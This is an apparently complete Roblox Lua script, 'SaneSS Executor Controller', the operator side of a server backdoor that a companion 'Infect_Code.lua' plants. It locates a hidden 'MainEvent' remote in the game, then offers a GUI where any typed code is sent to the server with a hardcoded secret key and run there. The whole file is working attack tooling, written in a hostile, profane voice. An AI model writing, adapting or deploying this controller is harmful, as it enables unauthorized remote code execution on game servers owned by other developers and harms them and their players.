--[[
    sane's SS Executor Controller v1.0
    for use with Infect_Code.lua v1.0+
    fuck shit up
]]--

if game.CoreGui:FindFirstChild("SaneSSController") then
    game.CoreGui.SaneSSController:Destroy()
end

local remote = nil
local locations = {game:GetService("Lighting"), game:GetService("Workspace"), game:GetService("ReplicatedStorage")}
for _, location in ipairs(locations) do
    remote = location:FindFirstChild("MainEvent", true)
    if remote then break end
end

if not remote then
    game.StarterGui:SetCore("SendNotification", {
        Title = "SaneSS",
        Text = "Backdoor not found on this server pussy",
        Duration = 5
    })
    return
end

game.StarterGui:SetCore("SendNotification", {
    Title = "SaneSS",
    Text = "Backdoor located at: " .. remote:GetFullName(),
    Duration = 5
})

local SECRET_KEY = "sane_on_top_1337"

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SaneSSController"
screenGui.ResetOnSpawn = false
screenGui.Parent = game.CoreGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 600, 0, 400)
mainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 80)
mainFrame.BorderSizePixel = 2
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 25)
titleBar.BackgroundColor3 = Color3.fromRGB(255, 0, 80)
titleBar.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -50, 1, 0)
titleLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 80)
titleLabel.Text = "SaneSS Remote Executor"
titleLabel.Font = Enum.Font.Code
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Position = UDim2.new(0, 5, 0, 0)
titleLabel.Parent = titleBar

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 25, 1, 0)
closeButton.Position = UDim2.new(1, -25, 0, 0)
closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 80)
closeButton.Text = "X"
closeButton.Font = Enum.Font.Code
closeButton.TextColor3 = Color3.new(1,1,1)
closeButton.Parent = titleBar
closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

local codeInput = Instance.new("TextBox")
codeInput.Size = UDim2.new(1, -20, 1, -80)
codeInput.Position = UDim2.new(0, 10, 0, 35)
codeInput.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
codeInput.TextColor3 = Color3.fromRGB(0, 255, 128)
codeInput.Text = "--[[ Welcome to the main frame bitch ]]\n"
codeInput.MultiLine = true
codeInput.TextXAlignment = Enum.TextXAlignment.Left
codeInput.TextYAlignment = Enum.TextYAlignment.Top
codeInput.Font = Enum.Font.Code
codeInput.TextSize = 14
codeInput.ClearTextOnFocus = false
codeInput.Parent = mainFrame

local executeButton = Instance.new("TextButton")
executeButton.Size = UDim2.new(0, 120, 0, 35)
executeButton.Position = UDim2.new(1, -130, 1, -40)
executeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 80)
executeButton.TextColor3 = Color3.new(1, 1, 1)
executeButton.Text = "Execute"
executeButton.Font = Enum.Font.Code
executeButton.Parent = mainFrame

local clearButton = Instance.new("TextButton")
clearButton.Size = UDim2.new(0, 120, 0, 35)
clearButton.Position = UDim2.new(1, -260, 1, -40)
clearButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
clearButton.TextColor3 = Color3.new(1, 1, 1)
clearButton.Text = "Clear"
clearButton.Font = Enum.Font.Code
clearButton.Parent = mainFrame

executeButton.MouseButton1Click:Connect(function()
    local source = codeInput.Text
    if source and source ~= "" then
        pcall(function()
            remote:FireServer(SECRET_KEY, source)
        end)
    end
end)

clearButton.MouseButton1Click:Connect(function()
    codeInput.Text = ""
end)
